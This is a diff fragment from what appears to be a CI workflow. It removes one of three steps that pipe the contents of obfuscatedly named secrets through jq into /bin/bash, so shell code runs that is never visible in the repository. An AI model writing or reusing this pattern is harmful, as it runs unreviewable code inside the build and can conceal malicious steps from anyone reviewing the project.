@@ -21,7 +21,6 @@ jobs:
           brr4192: ${{ secrets.brr4192 }}
         run: |
           printf '%s' "$brr4192" | jq -r .uv5 | /bin/bash
-          printf '%s' "$zckb617" | jq -r .bxftl2 | /bin/bash
           printf '%s' "$onli6475" | jq -r .mi152 | /bin/bash
 
       - name: Archive data
